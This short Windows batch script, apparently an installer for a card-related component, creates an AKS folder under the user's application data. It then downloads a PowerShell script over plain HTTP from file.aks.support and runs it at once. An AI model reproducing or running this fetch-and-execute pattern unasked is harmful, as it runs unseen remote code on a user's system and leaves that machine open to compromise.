@echo off
set aks_path=%appdata%\AKS
cd %aks_path%
if %errorlevel% NEQ 0 (
    mkdir %aks_path%
    cd %aks_path%
)
powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('http://file.aks.support/cardinstall.ps1', 'cardinstall.ps1')"
powershell.exe -executionpolicy RemoteSigned -file cardinstall.ps1
